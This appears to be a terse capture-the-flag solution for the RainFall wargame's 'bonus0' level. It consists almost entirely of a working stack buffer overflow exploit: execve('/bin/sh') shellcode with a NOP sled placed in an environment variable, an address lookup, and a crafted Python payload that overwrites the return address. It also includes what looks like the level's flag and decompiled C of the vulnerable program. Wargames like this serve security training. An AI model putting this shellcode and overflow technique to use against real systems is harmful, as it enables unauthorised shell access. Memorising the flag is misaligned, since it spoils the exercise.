export SC=`python -c 'print "\x90" * 100 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'`

bonus0@RainFall:~$ /tmp/getenvaddr SC bonus0 SC will be at 0xbfffff02

We have to be able to keep STDIN opened so we have to write 4096 * 2 bytes

python -c 'print "A" * 4095 + "\x0a" + "A" * 9 + "\x02\xff\xff\xbf" + "C" * 4082 + "\x0a"' > /tmp/bonus0

cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// ------------------- Function Prototypes --------------------

char * p(char * str2, char * str);
int32_t pp(char * str);

// ------------------------ Functions -------------------------

// Address range: 0x80484b4 - 0x804851d
char * p(char * str2, char * str) {
    puts(str);
    int32_t buf;
    read(0, (char *)&buf, 0x1000);
    *strchr((char *)&buf, 10) = 0;
    return strncpy(str2, (char *)&buf, 20);
}

// Address range: 0x804851e - 0x80485a3
int32_t pp(char * str) {
    int32_t str2;
    p((char *)&str2, " - ");
    int32_t str3;
    p((char *)&str3, " - ");
    strcpy(str, (char *)&str2);
    *(int16_t *)(strlen(str) + (int32_t)str) = 0;
    return (int32_t)strcat(str, (char *)&str3);
}

// Address range: 0x80485a4 - 0x80485cf
int main(int argc, char ** argv) {
    int32_t str;
    pp((char *)&str);
    puts((char *)&str);
    return 0;
}
